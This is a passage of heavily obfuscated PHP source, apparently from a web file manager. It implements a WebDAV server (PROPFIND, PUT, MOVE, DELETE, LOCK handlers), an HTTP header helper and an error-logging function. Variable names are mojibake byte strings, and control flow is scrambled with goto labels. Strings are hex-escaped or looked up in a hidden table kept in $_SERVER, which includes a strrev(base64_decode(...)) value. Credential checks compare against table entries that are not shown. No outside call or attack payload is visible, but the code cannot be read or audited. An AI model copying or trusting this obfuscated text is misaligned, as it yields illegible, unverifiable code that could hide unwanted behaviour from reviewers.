$this->add($D®©á Óò); $bÍ¨¶ ³Ù± .= $E´Ô÷½®¯Å . $a±ä‹˜È•—[47]; } } goto AŒ”¼Ô¸è¤; Eêò¢  ¦Ÿ: $a±ä‹˜È•— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_array($D±…Ëà˜Ùó)) { $D±…Ëà˜Ùó = array($D±…Ëà˜Ùó); } $aË’Ñ­—ô¿ = parent::listData(); goto A¥Èœ±ŞÓ; AŒ”¼Ô¸è¤: $bÍ¨¶ ³Ù± = rtrim($bÍ¨¶ ³Ù±, $a±ä‹˜È•—[47]); Model($a±ä‹˜È•—[479])->metaSet($bõ¥¹¿ŒÇ½, self::JOB_KEY, $bÍ¨¶ ³Ù±); goto bô¦Œ‹Æéİ; bô¦Œ‹Æéİ: } public function getUserJob($AÅŠ§±è—) { $f’´Õ®ŒĞ± = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][479])->metaGet($AÅŠ§±è—); return $this->getUserJobInfo($f’´Õ®ŒĞ±[self::JOB_KEY]); } public function getUserJobInfo($E¤–ì…¬‰É) { goto cëÊÌ¨ğ™È; cëÊÌ¨ğ™È: $B°ö¼Š«¿Õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aˆ¯¢‘ß = explode($B°ö¼Š«¿Õ[47], $E¤–ì…¬‰É); $f»ñ¾‰®‚ö = parent::listData(); goto d¹Œ…ïÎ‘; d¹Œ…ïÎ‘: $f»ñ¾‰®‚ö = array_remove_key($f»ñ¾‰®‚ö, $B°ö¼Š«¿Õ[187]); $eŞò±àòæ = array(); foreach ($aˆ¯¢‘ß as $A±Ø±ÂùŒ) { if (isset($f»ñ¾‰®‚ö[$A±Ø±ÂùŒ])) { $eŞò±àòæ[] = $f»ñ¾‰®‚ö[$A±Ø±ÂùŒ]; } } goto b´¡°îò‰„; b´¡°îò‰„: return $eŞò±àòæ; goto c–¹ÆáãÌ¿; c–¹ÆáãÌ¿: } } goto FÛÂ‘ö†µí; fò‚Ã‹í¡: function beforeShutdownError($d‡ŞÚÎÙÛé = false, $aÂÜÇÁâ©´ = '', $Fóà»ÚÅ˜î = '', $dš¼Ñ¥Â  = 0) { $Få¡„Ï‹¥Œ =& $_SERVER[¡Áã]; switch ($d‡ŞÚÎÙÛé) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $B™Â×Ö±İº = $Få¡„Ï‹¥Œ[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $B™Â×Ö±İº = $Få¡„Ï‹¥Œ[36]; break; case E_STRICT: $B™Â×Ö±İº = $Få¡„Ï‹¥Œ[37]; break; case E_NOTICE: case E_USER_NOTICE: $B™Â×Ö±İº = $Få¡„Ï‹¥Œ[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $B™Â×Ö±İº = $Få¡„Ï‹¥Œ[39]; break; default: break; } if (!$B™Â×Ö±İº || $B™Â×Ö±İº == $Få¡„Ï‹¥Œ[38] || $B™Â×Ö±İº == $Få¡„Ï‹¥Œ[39]) { return; } $Fóà»ÚÅ˜î = $Få¡„Ï‹¥Œ[4] . str_replace($_SERVER[$Få¡„Ï‹¥Œ[33]], $Få¡„Ï‹¥Œ[16], $Fóà»ÚÅ˜î); $dÂ– Ç¥ãº = $B™Â×Ö±İº . $Få¡„Ï‹¥Œ[40] . $aÂÜÇÁâ©´ . $Få¡„Ï‹¥Œ[40] . $Fóà»ÚÅ˜î . $Få¡„Ï‹¥Œ[40] . $dš¼Ñ¥Â ; write_log($dÂ– Ç¥ãº . $Få¡„Ï‹¥Œ[41] . get_caller_msg(1), $Få¡„Ï‹¥Œ[15]); } $_SERVER[$_SERVER[¡Áã][42]] = $_SERVER[$_SERVER[¡Áã][33]] . $_SERVER[¡Áã][43]; $cå¡»Ïöâ = strrev(base64_decode($_SERVER[¡Áã][44])); goto b½÷É®‘¹; bà‰¥×Áåƒ: class HttpDavServer { public function __construct($CÍ„œŠ¹íŞ, $dˆ§º’Í¥) { $this->root = $CÍ„œŠ¹íŞ; $this->initPath($dˆ§º’Í¥); $this->start(); } public function initPath($bÌ·´£ˆğˆ) { $bê†™–Ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fç‰È°§Üì = rtrim($_SERVER[$bê†™–Ç[1388]], $bê†™–Ç[8]) . $bê†™–Ç[8]; $this->urlBase = substr($Fç‰È°§Üì, 0, strpos($Fç‰È°§Üì, $bÌ·´£ˆğˆ) + 1); $this->urlBase = rtrim($this->urlBase, $bê†™–Ç[8]) . $bÌ·´£ˆğˆ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E‘‹“±Öâà =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AùÜÔ„Í¡Ğ = HttpAuth::get(); if ($AùÜÔ„Í¡Ğ[$E‘‹“±Öâà[537]] == $E‘‹“±Öâà[1785] && $AùÜÔ„Í¡Ğ[$E‘‹“±Öâà[893]] == $E‘‹“±Öâà[1786]) { return !0; } HttpAuth::error(); } public function start() { goto F™éäÀğ¾÷; F×Ùº¹“Ä³: if (!$B†ÓÊ³ïå‹) { return; } self::response($B†ÓÊ³ïå‹); goto cÇ¬Øæ÷¾; F™éäÀğ¾÷: $C»ÑÔÍöˆÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->checkUser(); $F²äâ‰ô’è = $C»ÑÔÍöˆÀ[144] . HttpHeader::method(); goto Eò·Ä†Ûˆ‹; Eò·Ä†Ûˆ‹: if (!method_exists($this, $F²äâ‰ô’è)) { pr($F²äâ‰ô’è . $C»ÑÔÍöˆÀ[1787]); die; } $Cè½íßö´» = array($C»ÑÔÍöˆÀ[1788], $C»ÑÔÍöˆÀ[1789]); if (!in_array($F²äâ‰ô’è, $Cè½íßö´») && !$this->pathExists($this->path)) { $B†ÓÊ³ïå‹ = array($C»ÑÔÍöˆÀ[1029] => 404); } else { $B†ÓÊ³ïå‹ = $this->{$F²äâ‰ô’è}(); } goto F×Ùº¹“Ä³; cÇ¬Øæ÷¾: } public function pathGet($A®“¾â¥Ó = false) { $b—äÈÍÄ° =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dãµÂ‘ù•æ = $A®“¾â¥Ó ? $_SERVER[$b—äÈÍÄ°[1790]] : $_SERVER[$b—äÈÍÄ°[1388]]; $dãµÂ‘ù•æ = KodIO::clear(rawurldecode($dãµÂ‘ù•æ)); if (!strstr($dãµÂ‘ù•æ, KodIO::clear($this->urlBase))) { return !1; } return substr($dãµÂ‘ù•æ, strpos($dãµÂ‘ù•æ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Cç„æÔîã) { return file_exists($Cç„æÔîã); } public function pathMkdir($cÏŸğ£®¬) { return mkdir($cÏŸğ£®¬, 511, !0); } public function pathInfo($dĞÊã„Ÿ‚ö) { return path_info($dĞÊã„Ÿ‚ö); } public function pathList($b¾ÊÕ·õŒ) { return path_list($b¾ÊÕ·õŒ); } public function pathOut($BÂåè¡œ¥) { echo file_get_contents($BÂåè¡œ¥); } public function pathPut($dğÜŒêÇ, $A‚ĞÎ˜ÓÜ = '') { if (!$A‚ĞÎ˜ÓÜ) { return file_put_contents($dğÜŒêÇ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]); } return move_path($A‚ĞÎ˜ÓÜ, $dğÜŒêÇ); } public function pathRemove($a²†Š‰¤­¨) { if (is_file($a²†Š‰¤­¨)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($aàñèæÈÃ, $B® Û©è¨î) { return move_path($aàñèæÈÃ, $B® Û©è¨î); } public function pathCopy($F’‹†›ÇÎŒ, $b¥®ä‰•Ó) { return copy_dir($F’‹†›ÇÎŒ, $b¥®ä‰•Ó); } public function parsePath($cçŒÓŒ¤áÌ) { return $cçŒÓŒ¤áÌ; } public function parseItem($AõŞÔ°Í­ä, $F«ó‚¡‚·ˆ) { goto eè¿ØèšáÅ; cÆ•éË»©: if ($F«ó‚¡‚·ˆ) { $EŒ©íæ²‹İ = $A‘‰¯ğ„™ã[8] . str_replace($A‘‰¯ğ„™ã[172], $A‘‰¯ğ„™ã[8], rawurlencode($this->pathGet())); } if (!trim($AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[107]])) { $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[107]] = time(); } if (!trim($AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[187]])) { $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[187]] = time(); } goto båéìãİˆ; båéìãİˆ: $bÉ®ŸŒÅ•Ü = array($A‘‰¯ğ„™ã[1791] => KodIO::clear($this->urlBase . $EŒ©íæ²‹İ), $A‘‰¯ğ„™ã[107] => @gmdate($A‘‰¯ğ„™ã[1792], $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[107]]), $A‘‰¯ğ„™ã[187] => @gmdate($A‘‰¯ğ„™ã[1793], $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[187]]), $A‘‰¯ğ„™ã[77] => $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[77]] ? $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[77]] : 0); return $bÉ®ŸŒÅ•Ü; goto DêœœÁ¢±´; eè¿ØèšáÅ: $A‘‰¯ğ„™ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EŒ©íæ²‹İ = $this->pathGet() . $A‘‰¯ğ„™ã[8] . $AõŞÔ°Í­ä[$A‘‰¯ğ„™ã[28]]; $EŒ©íæ²‹İ = $A‘‰¯ğ„™ã[8] . str_replace($A‘‰¯ğ„™ã[172], $A‘‰¯ğ„™ã[8], rawurlencode($EŒ©íæ²‹İ)); goto cÆ•éË»©; DêœœÁ¢±´: } public function parseItemXml($f´›‚çÍó, $c“µø´õ) { $e—ğŒ¨š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e¸±Ğ˜¡‡• = $this->parseItem($f´›‚çÍó, $c“µø´õ); if ($f´›‚çÍó[$e—ğŒ¨š[29]] == $e—ğŒ¨š[76]) { $B¬âè…öÉ = $e—ğŒ¨š[1794]; $B¬âè…öÉ .= $e—ğŒ¨š[1795]; } else { $eŒµËÂˆöº = $f´›‚çÍó[$e—ğŒ¨š[160]] ? $f´›‚çÍó[$e—ğŒ¨š[160]] : get_path_ext($f´›‚çÍó[$e—ğŒ¨š[28]]); $A¼Àîİ÷ºõ = get_file_mime($eŒµËÂˆöº); $B¬âè…öÉ = $e—ğŒ¨š[1796]; $B¬âè…öÉ .= "\74\104\x3a\147\145\164\x63\157\x6e\164\x65\156\x74\x74\171\160\145\x3e{$A¼Àîİ÷ºõ}\74\x2f\x44\72\x67\145\164\x63\157\x6e\164\x65\x6e\164\164\171\160\145\76"; } return "\xa\11\11\x3c\104\x3a\162\145\x73\160\157\x6e\163\x65\76\xa\11\x9\x9\x3c\104\72\150\x72\x65\146\76{$e¸±Ğ˜¡‡•[$e—ğŒ¨š[1791]]}\74\57\104\72\150\162\x65\146\x3e\12\11\x9\x9\74\x44\x3a\160\162\157\x70\163\x74\141\164\76\12\11\11\11\x9\x3c\104\x3a\x70\x72\157\x70\76\12\11\11\x9\x9\x9\x3c\x44\72\147\x65\x74\154\x61\x73\164\x6d\x6f\144\x69\146\151\145\x64\x3e{$e¸±Ğ˜¡‡•[$e—ğŒ¨š[107]]}\x3c\x2f\104\x3a\147\x65\x74\154\141\163\164\x6d\157\144\151\x66\x69\x65\x64\76\12\11\11\11\11\11\74\x44\x3a\x63\x72\145\x61\164\151\157\x6e\144\141\164\145\x3e{$e¸±Ğ˜¡‡•[$e—ğŒ¨š[187]]}\x3c\x2f\x44\72\x63\x72\145\141\x74\x69\x6f\156\x64\141\x74\145\76\12\11\11\11\x9\x9\x3c\104\72\x67\145\x74\x63\157\x6e\x74\x65\156\x74\x6c\x65\x6e\147\x74\150\x3e{$e¸±Ğ˜¡‡•[$e—ğŒ¨š[77]]}\74\x2f\104\72\x67\145\x74\x63\x6f\156\x74\145\156\x74\x6c\x65\156\147\x74\150\x3e\12\x9\x9\x9\11\11{$B¬âè…öÉ}\xa\11\x9\x9\11\x3c\x2f\x44\x3a\x70\162\x6f\x70\x3e\12\11\11\11\11\74\104\x3a\x73\x74\141\x74\x75\x73\x3e\110\124\x54\x50\57\61\x2e\x31\x20\x32\x30\x30\40\117\x4b\x3c\x2f\104\72\163\x74\x61\x74\165\x73\x3e\12\x9\11\x9\74\x2f\104\x3a\x70\162\157\x70\163\x74\141\x74\76\xa\11\x9\x3c\x2f\104\x3a\x72\x65\163\160\x6f\156\163\145\x3e"; } public function pathListMerge($c³ËÔŞ…õ) { goto C´›ÑÒß¾ª; E”‹¶íÅÂ—: $cìÜ«º–‰– = array(); foreach ($c³ËÔŞ…õ as $bèã‚íÃ† => $eĞêïš†ˆá) { if (!in_array($bèã‚íÃ†, $c¯­„ÅÀ”) || !is_array($eĞêïš†ˆá)) { continue; } $cìÜ«º–‰– = array_merge($cìÜ«º–‰–, $eĞêïš†ˆá); } foreach ($cìÜ«º–‰– as &$E™óãä‚¯) { $E™óãä‚¯[$bââ÷£ß¥ô[28]] = str_replace($bââ÷£ß¥ô[8], $bââ÷£ß¥ô[1390], $E™óãä‚¯[$bââ÷£ß¥ô[28]]); } goto a¬ÜªÁµõÛ; C´›ÑÒß¾ª: $bââ÷£ß¥ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$c³ËÔŞ…õ) { return $c³ËÔŞ…õ; } $c¯­„ÅÀ” = array($bââ÷£ß¥ô[73], $bââ÷£ß¥ô[74], $bââ÷£ß¥ô[1797]); goto E”‹¶íÅÂ—; a¬ÜªÁµõÛ: unset($E™óãä‚¯); return $cìÜ«º–‰–; goto dœÂå¤˜½; dœÂå¤˜½: } public function httpPROPFIND() { goto E³Ş™ó†‰À; CöÓ±Æ’›: $fíè›Š»Ø = $A˜³’ùõ [$C¡–Á§‹²ˆ[1798]]; if (!is_array($fù¾ÖãÈš¼) || $fíè›Š»Ø[$C¡–Á§‹²ˆ[1799]] === !1) { return array($C¡–Á§‹²ˆ[1800] => 404, $C¡–Á§‹²ˆ[1801] => $C¡–Á§‹²ˆ[1802]); } $bä¨ÂˆÈôá = $fíè›Š»Ø[$C¡–Á§‹²ˆ[29]] == $C¡–Á§‹²ˆ[167] || HttpHeader::get($C¡–Á§‹²ˆ[1777]) == $C¡–Á§‹²ˆ[470]; goto c÷¬àƒ†â; AÍ×†ğ£†: return array($C¡–Á§‹²ˆ[1800] => 207, $C¡–Á§‹²ˆ[1801] => "\x3c\x44\x3a\x6d\165\x6c\x74\x69\x73\x74\x61\164\x75\x73\x20\x78\x6d\x6c\156\163\x3a\x44\75\42\x44\101\126\x3a\42\x3e\12{$a¿É·“µ‹¢}\12\x3c\x2f\104\72\x6d\x75\x6c\x74\151\163\x74\x61\x74\165\x73\x3e"); goto B“ÍØ¬¬Ã; c÷¬àƒ†â: if ($bä¨ÂˆÈôá) { $fù¾ÖãÈš¼ = array($fíè›Š»Ø); } else { $fíè›Š»Ø[$C¡–Á§‹²ˆ[28]] = $C¡–Á§‹²ˆ[33]; $fù¾ÖãÈš¼ = array_merge(array($fíè›Š»Ø), $fù¾ÖãÈš¼); } $a¿É·“µ‹¢ = $C¡–Á§‹²ˆ[33]; foreach ($fù¾ÖãÈš¼ as $FÑ³…öÙ©¹) { $a¿É·“µ‹¢ .= $this->parseItemXml($FÑ³…öÙ©¹, $bä¨ÂˆÈôá); } goto AÍ×†ğ£†; E³Ş™ó†‰À: $C¡–Á§‹²ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A˜³’ùõ  = $this->pathList($this->path); $fù¾ÖãÈš¼ = $this->pathListMerge($A˜³’ùõ ); goto CöÓ±Æ’›; B“ÍØ¬¬Ã: } public function httpHEAD() { $E¯ùì×ãç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d­‹£ï…„ª = $this->pathInfo($this->path); if (!$d­‹£ï…„ª || $d­‹£ï…„ª[$E¯ùì×ãç[29]] == $E¯ùì×ãç[76]) { return array($E¯ùì×ãç[1029] => 200, $E¯ùì×ãç[1206] => array($E¯ùì×ãç[1803])); } return array($E¯ùì×ãç[1029] => 200, $E¯ùì×ãç[1206] => array($E¯ùì×ãç[1804], $E¯ùì×ãç[136], $E¯ùì×ãç[1805] . $d­‹£ï…„ª[$E¯ùì×ãç[77]], $E¯ùì×ãç[1806] . get_file_mime($d­‹£ï…„ª[$E¯ùì×ãç[160]]), $E¯ùì×ãç[132] . gmdate($E¯ùì×ãç[1792], $d­‹£ï…„ª[$E¯ùì×ãç[1253]]) . $E¯ùì×ãç[1807], $E¯ùì×ãç[1808])); } public function httpOPTIONS() { $dôÊÕ¯¤ç– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($dôÊÕ¯¤ç–[1029] => 200, $dôÊÕ¯¤ç–[1206] => array($dôÊÕ¯¤ç–[1809], $dôÊÕ¯¤ç–[1810], $dôÊÕ¯¤ç–[1811], $dôÊÕ¯¤ç–[1262])); } public function httpPROPPATCH() { $cää­­­Ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¬ïÏÇß‚œ = $cää­­­Ä[1812] . $_SERVER[$cää­­­Ä[1388]] . $cää­­­Ä[1813]; return array($cää­­­Ä[1800] => 207, $cää­­­Ä[1801] => "\x3c\x44\x3a\x6d\165\x6c\x74\x69\x73\164\x61\x74\x75\163\x20\170\x6d\154\x6e\163\72\104\x3d\x22\104\101\x56\x3a\x22\x3e\xa{$a¬ïÏÇß‚œ}\12\x3c\57\104\72\x6d\165\x6c\164\151\x73\164\x61\x74\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $CŞŸÅÖ…Û‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÁ„º¬„½ = $this->uploadFile(); if ($AÁ„º¬„½) { $aºÕÌ«éÄ¿ = 204; } else { $AÁ„º¬„½ = $CŞŸÅÖ…Û‡[33]; $aºÕÌ«éÄ¿ = 201; } $cÕ´æÍàæ = $this->pathPut($this->path, $AÁ„º¬„½); if ($cÕ´æÍàæ == !1) { $aºÕÌ«éÄ¿ = 404; } return array($CŞŸÅÖ…Û‡[1800] => $aºÕÌ«éÄ¿); } private function uploadFile() { goto dŒÄÉóÏÃ; d‡Ö‡‘Œá³: $cå¹°ˆ‹— = @fopen($Fù¯ğÄ´˜å, $DÇÁ—Ù¶ê¸[1522]); $A¾Ó´à«› = @fopen($DÇÁ—Ù¶ê¸[1815], $DÇÁ—Ù¶ê¸[1521]); if (!$A¾Ó´à«› || !$cå¹°ˆ‹—) { @unlink($Fù¯ğÄ´˜å); return !1; } goto CÌ£Ê½î—; dŒÄÉóÏÃ: $DÇÁ—Ù¶ê¸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; @mk_dir(TEMP_FILES); $Fù¯ğÄ´˜å = TEMP_FILES . $DÇÁ—Ù¶ê¸[1814] . rand_string(32); goto d‡Ö‡‘Œá³; CÌ£Ê½î—: while (!feof($A¾Ó´à«›)) { fwrite($cå¹°ˆ‹—, fread($A¾Ó´à«›, 1024 * 200)); } fclose($A¾Ó´à«›); fclose($cå¹°ˆ‹—); goto fÓ®»‡¹ù–; fÓ®»‡¹ù–: if (@filesize($Fù¯ğÄ´˜å) > 0) { return $Fù¯ğÄ´˜å; } @unlink($Fù¯ğÄ´˜å); return !1; goto C§ÎéØË‡¶; C§ÎéØË‡¶: } public function httpMKCOL() { $EÎ”ã¬÷á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->pathExists($this->path)) { return array($EÎ”ã¬÷á[1029] => 409); } $aé¬„ôÓè = $this->pathMkdir($this->path); return array($EÎ”ã¬÷á[1029] => $aé¬„ôÓè ? 201 : 403); } public function httpMOVE() { $F—–¶‰á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A›±†Œ°Ñæ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$F—–¶‰á[1816]])) { $CÃñéšÉÃ‘[$F—–¶‰á[1817]] = $_SERVER[$F—–¶‰á[1816]] == $F—–¶‰á[1818]; } $FÇ”´Óù÷é = $this->pathMove($this->path, $A›±†Œ°Ñæ); return array($F—–¶‰á[1029] => $FÇ”´Óù÷é ? 201 : 404); } public function httpCOPY() { $Aáé¬çÔ• = $this->parsePath($this->pathGet(!0)); $eïÓÂœ —ò = $this->pathCopy($this->path, $Aáé¬çÔ•); return array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1029] => $eïÓÂœ —ò ? 201 : 404); } public function httpDELETE() { $DØ«Š£ÃË› = $this->pathRemove($this->path); return array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1029] => $DØ«Š£ÃË› ? 200 : 503); } public function httpLOCK() { $Dà›’Í¬§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A‡ÈÀ‹³‰ = md5($this->path); $Bˆ«¥¦ß¬ = $Dà›’Í¬§[1819] . $this->xmlGet($Dà›’Í¬§[1820]) . $Dà›’Í¬§[1821] . $A‡ÈÀ‹³‰ . $Dà›’Í¬§[1822]; return array($Dà›’Í¬§[1029] => 200, $Dà›’Í¬§[1206] => array($Dà›’Í¬§[1823] . $A‡ÈÀ‹³‰, $Dà›’Í¬§[1824]), $Dà›’Í¬§[1825] => $Bˆ«¥¦ß¬); } public function httpUNLOCK() { return array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1029] => 204); } public function xmlGet($A’©åŸá÷) { goto EéŸ¯›Í™; B Ñ¬“Úé©: if ($DçÉçÔ«¸) { return $DçÉçÔ«¸[0]->nodeValue; } return $eï™›…Ïš[33]; goto e£ÆÑ§›áĞ; e‚’…“Á…: $FçàŸ±ˆ—İ = explode($eï™›…Ïš[8], $A’©åŸá÷); $bÕ«Ù®ƒÈ³ = array_shift($FçàŸ±ˆ—İ); $DçÉçÔ«¸ = $aÃŠÔÆŞ†‘->getElementsByTagNameNS($eï™›…Ïš[1827], $bÕ«Ù®ƒÈ³); goto B Ñ¬“Úé©; EéŸ¯›Í™: $eï™›…Ïš =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $aÃŠÔÆŞ†‘ = false; if (!$aÃŠÔÆŞ†‘) { $D‘¾×Œ±Òö = file_get_contents($eï™›…Ïš[1826]); $aÃŠÔÆŞ†‘ = new DOMDocument(); $aÃŠÔÆŞ†‘->loadXML($D‘¾×Œ±Òö); } goto e‚’…“Á…; e£ÆÑ§›áĞ: } public static function response($dŞ‹šµÂ…Ñ) { goto Eå˜­õƒö¯; D°«ùÛ¯ĞŒ: if (is_string($dŞ‹šµÂ…Ñ[$FİŞŒ¶Çğ[1825]])) { header($FİŞŒ¶Çğ[1828]); $dÎñ¥­¯®¥ = $FİŞŒ¶Çğ[1829] . $FİŞŒ¶Çğ[217] . $dŞ‹šµÂ…Ñ[$FİŞŒ¶Çğ[1825]]; echo $dÎñ¥­¯®¥; } goto dª°ïÕ»²’; eù á§›«İ: $Dİ…‚¬è±ƒ[] = $FİŞŒ¶Çğ[1767]; $Dİ…‚¬è±ƒ[] = $FİŞŒ¶Çğ[1768]; foreach ($Dİ…‚¬è±ƒ as $E›ÜŞ®É„æ) { header($E›ÜŞ®É„æ); } goto D°«ùÛ¯ĞŒ; Eå˜­õƒö¯: $FİŞŒ¶Çğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dİ…‚¬è±ƒ = is_array($dŞ‹šµÂ…Ñ[$FİŞŒ¶Çğ[1206]]) ? $dŞ‹šµÂ…Ñ[$FİŞŒ¶Çğ[1206]] : array(); $Dİ…‚¬è±ƒ[] = HttpHeader::code($dŞ‹šµÂ…Ñ[$FİŞŒ¶Çğ[1029]]); goto eù á§›«İ; dª°ïÕ»²’: } } class HttpHeader { public static $_headers = array("\x48\x6f\163\164" => "\110\x54\x54\120\137\110\117\123\x54", "\x55\x73\145\162\55\101\147\145\x6e\x74" => "\x48\124\124\120\137\125\x53\105\x52\x5f\101\107\x45\116\124", "\x43\157\156\x74\145\x6e\164\55\124\x79\160\145" => "\x48\x54\124\120\137\103\x4f\x4e\124\105\x4e\124\137\124\131\x50\x45", "\103\157\x6e\164\145\156\x74\x2d\114\145\x6e\x67\x74\x68" => "\x48\x54\x54\120\137\103\x4f\116\124\x45\x4e\124\137\x4c\x45\x4e\107\x54\110", "\x44\145\x70\164\x68" => "\x48\x54\124\x50\137\x44\x45\x50\124\110", "\105\x78\160\x65\143\164" => "\110\124\x54\120\x5f\105\x58\x50\105\x43\x54", "\x49\146\x2d\116\x6f\156\x65\x2d\x4d\141\x74\x63\x68" => "\x48\x54\124\x50\137\111\106\x5f\x4e\x4f\x4e\x45\x5f\x4d\x41\x54\103\110", "\111\146\x2d\x4d\141\x74\143\150" => "\x48\x54\124\x50\x5f\111\106\137\115\101\x54\x43\110", "\x49\146\55\x52\141\156\147\x65" => "\x48\124\124\x50\x5f\111\106\137\x52\x41\116\107\105", "\x4c\x61\163\164\55\x4d\x6f\144\151\x66\x69\145\x64" => "\110\x54\x54\120\137\x4c\x41\123\124\x5f\x4d\x4f\x44\x49\106\x49\105\104", "\111\x66\x2d\115\157\144\x69\x66\x69\x65\144\x2d\123\151\x6e\143\145" => "\x48\x54\124\x50\137\111\106\137\115\117\x44\x49\x46\x49\105\104\137\x53\111\x4e\x43\105", "\111\x66\55\x55\156\x6d\157\144\151\x66\x69\x65\x64\55\123\x69\156\143\145" => "\110\124\x54\x50\x5f\x49\106\x5f\125\116\115\x4f\x44\x49\x46\111\x45\104\x5f\x53\x49\x4e\x43\x45", "\122\x61\156\x67\145" => "\110\124\124\120\x5f\122\101\116\107\x45", "\x54\151\155\145\157\x75\x74" => "\x48\x54\124\120\137\x54\x49\x4d\x45\x4f\x55\124", "\x49\146" => "\x48\124\124\x50\137\x49\x46", "\x4c\157\x63\153\x2d\124\157\153\145\156" => "\x48\x54\x54\x50\x5f\x4c\x4f\x43\x4b\137\x54\x4f\x4b\105\116", "\117\x76\145\x72\x77\x72\151\x74\145" => "\110\x54\124\x50\x5f\x4f\x56\105\122\x57\122\x49\124\x45", "\104\145\x73\x74\x69\156\141\164\151\157\156" => "\110\x54\124\120\x5f\x44\105\x53\x54\111\x4e\101\x54\111\117\x4e", "\x52\x65\161\x75\x65\163\164\55\x49\144" => "\122\x45\x51\125\x45\123\124\x5f\111\104", "\122\145\x71\x75\x65\x73\x74\x2d\102\x6f\x64\x79\55\106\x69\154\145" => "\122\105\x51\x55\105\x53\124\x5f\102\117\104\131\137\106\111\x4c\x45", "\122\145\144\x69\162\x65\x63\164\55\x53\164\x61\x74\x75\x73" => "\122\x45\104\111\122\105\103\124\137\123\x54\101\124\x55\x53"); public static function init() { static $dö„Šï”Å = false; if ($dö„Šï”Å) { return; } foreach ($_SERVER as $FÛõŠ†Ğ…ˆ => $D”—çÈÖÕÄ) { $FÛõŠ†Ğ…ˆ = strtoupper($FÛõŠ†Ğ…ˆ); if (!array_key_exists($FÛõŠ†Ğ…ˆ, $_SERVER)) { continue; } $_SERVER[$FÛõŠ†Ğ…ˆ] = $D”—çÈÖÕÄ; } foreach (self::$_headers as $FÛõŠ†Ğ…ˆ => $DôòÕò°µ¹) { if (!array_key_exists($FÛõŠ†Ğ…ˆ, $_SERVER)) { continue; } $_SERVER[$FÛõŠ†Ğ…ˆ] = $_SERVER[$DôòÕò°µ¹]; $_SERVER[strtoupper($FÛõŠ†Ğ…ˆ)] = $_SERVER[$DôòÕò°µ¹]; } } public static function get($E‡ÊÕÒŠÂõ) { self::init(); return $_SERVER[$E‡ÊÕÒŠÂõ] ? $_SERVER[$E‡ÊÕÒŠÂõ] : $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1830] . strtoupper($E‡ÊÕÒŠÂõ)]; } public static function method() { return strtoupper(self::get($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][154])); } public static function length() { $EÇ»›¹³¾é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fµ¹ôœíÖá = self::get($EÇ»›¹³¾é[1831]); if (!$fµ¹ôœíÖá) { $fµ¹ôœíÖá = self::get($EÇ»›¹³¾é[1145]); } return $fµ¹ôœíÖá; } public static function range() { $E±®î³°«‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÅ‡ÁŞ´ = self::get($E±®î³°«‡[198]); if (!$eÅ‡ÁŞ´) { return !1; } if (!preg_match($E±®î³°«‡[1832], $eÅ‡ÁŞ´, $B¥•¼á¨£¦)) { return !1; } if ($B¥•¼á¨£¦[1] === $E±®î³°«‡[33] && $B¥•¼á¨£¦[2] === $E±®î³°«‡[33]) { return !1; } return array($B¥•¼á¨£¦[1] !== $E±®î³°«‡[33] ? $B¥•¼á¨£¦[1] : null, $B¥•¼á¨£¦[2] !== $E±®î³°«‡[33] ? $B¥•¼á¨£¦[2] : null); } public static $statusCode = array("\61\60\x30" => "\103\x6f\x6e\164\x69\x6e\165\145", "\x31\x30\61" => "\x53\x77\x69\164\x63\150\151\x6e\x67\x20\120\x72\x6f\164\x6f\143\157\x6c", "\61\x30\62" => "\x50\x72\x6f\x63\145\x73\x73\151\156\x67", "\x31\x30\x33" => "\x45\141\x72\x6c\171\40\x48\151\x6e\x74\x73", "\62\60\60" => "\x4f\113", "\x32\x30\61" => "\103\x72\x65\141\164\x65\x64", "\62\60\62" => "\x41\x63\143\145\160\x74\145\x64", "\62\60\x33" => 